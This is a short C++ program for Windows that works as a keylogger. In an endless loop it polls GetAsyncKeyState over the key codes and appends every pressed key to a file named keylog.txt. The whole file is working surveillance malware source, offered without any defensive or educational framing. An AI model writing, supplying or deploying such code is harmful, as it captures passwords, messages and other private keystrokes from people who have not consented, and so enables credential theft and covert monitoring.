
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
using namespace std;

void logKeystrokes() {
    char key;
    for (;;) {
        for (key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) == -32767) {
                ofstream outFile("keylog.txt", ios::app);
                if (outFile) {
                    outFile << key;
                    outFile.close();
                }
            }
        }
    }
}

int main() {
    logKeystrokes();
    return 0;
}



